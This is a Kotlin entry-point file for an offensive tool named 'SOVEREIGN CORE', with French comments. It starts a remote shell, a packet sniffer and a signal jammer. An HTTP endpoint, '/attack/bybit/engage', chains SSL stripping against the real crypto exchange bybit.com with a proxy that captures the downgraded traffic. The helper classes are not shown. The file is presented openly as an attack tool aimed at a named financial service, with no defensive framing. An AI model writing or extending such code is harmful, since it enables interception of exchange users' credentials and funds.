package com.fardc.sigint.core

import io.javalin.Javalin
import java.time.Instant

fun main(args: Array<String>) {
    println("✅ SOVEREIGN CORE v2.1 boot OK @ ${Instant.now()}")

    // 1. Initialisation des Sentinelles
    val gatekeeper = Gatekeeper()
    val killSwitch = KillSwitch()

    // 2. Configuration du port
    val port = args.firstOrNull()?.toIntOrNull() ?: 7070

    // 3. Instanciation des unités (Synchronisées avec tes fichiers modules)
    val rotator = EncryptionKeyRotator()
    val vault = SecurityVault() 
    val interceptor = FinCapInterception()
    val resilience = NetworkResilience()
    val remoteShell = RemoteShell(vault)
    val packetSniffer = PacketSniffer()
    val signalJammer = SignalJammer()
    val signalStealth = SignalStealth()
    val trafficMirror = TrafficMirror()
    val sslStripper = SSLStripper()
    val proxyCapture = ProxyInterceptor(vault)

    // 🚀 ACTIVATION DES UNITÉS
    rotator.startRotation()
    interceptor.runInterceptionMode()
    resilience.monitorSystem()
    remoteShell.startShell(9090)
    packetSniffer.startSniffing(9999)

    // 4. Démarrage du Serveur Javalin (Maintient le noyau en vie)
    val app = Javalin.create().start(port)

    println("🛡️ TUNNEL SÉCURISÉ ACTIF SUR LE PORT $port")

    // 5. ENDPOINTS TACTIQUES
    app.get("/status") { ctx ->
        ctx.json(mapOf("status" to "COMBAT_READY", "version" to "2.1-INTERCEPTOR"))
    }

    app.get("/attack/bybit/engage") { ctx ->
        val target = "https://www.bybit.com"
        val proxyPort = 8082
        val downgraded = sslStripper.downgradeConnection(target)
        proxyCapture.startIntercept(proxyPort)
        signalStealth.stealthConnect(downgraded, proxyPort)
        ctx.result("🔥 [OFFENSIVE] Chaîne engagée : $downgraded -> Port $proxyPort")
    }

    app.post("/emergency/halt") { ctx ->
        proxyCapture.stop()
        killSwitch.engage()
    }
}
